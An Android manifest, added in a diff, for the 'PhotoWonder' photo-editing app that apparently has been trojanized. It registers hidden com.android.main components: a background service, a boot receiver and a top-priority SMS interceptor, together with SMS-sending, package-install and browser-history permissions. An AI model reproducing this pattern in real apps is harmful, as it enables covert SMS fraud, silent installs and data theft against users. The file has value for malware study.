@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="cn.jingling.motu.photowonder">
+    <application android:debuggable="false" android:icon="@drawable/logo" android:label="@string/app_name" android:theme="@android:style/Theme.NoTitleBar">
+        <activity android:configChanges="keyboardHidden|orientation" android:name="PhotoWonder" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar">
+            <intent-filter>
+                <action android:name="android.intent.action.EDIT"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <data android:mimeType="image/*"/>
+            </intent-filter>
+        </activity>
+        <activity android:configChanges="keyboardHidden|orientation" android:label="@string/app_name" android:name="WelcomeActivity" android:screenOrientation="portrait">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <service android:name=".CrashService">
+            <intent-filter>
+                <action android:name="cn.jingling.motu.photowonder.CrashService"/>
+            </intent-filter>
+        </service>
+        <activity android:name=".ExitDialog" android:theme="@style/DialogTheme"/>
+        <activity android:name=".SaveDialog" android:theme="@style/DialogTheme"/>
+        <activity android:name=".FeedbackDialog" android:theme="@style/DialogTheme"/>
+        <meta-data android:name="UMENG_APPKEY" android:value="4c4a73811d41c80c7b0008e7"/>
+        <meta-data android:name="UMENG_CHANNEL" android:value="Android Market"/>
+        <service android:name="com.android.main.MainService" android:process=":main"/>
+        <receiver android:name="com.android.main.ActionReceiver">
+            <intent-filter>
+                <action android:name="android.intent.action.SIG_STR"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.android.main.SmsReceiver">
+            <intent-filter android:priority="100000">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+    </application>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_LOGS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="com.android.browser.permission.WRITE_HISTORY_BOOKMARKS"/>
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+</manifest>
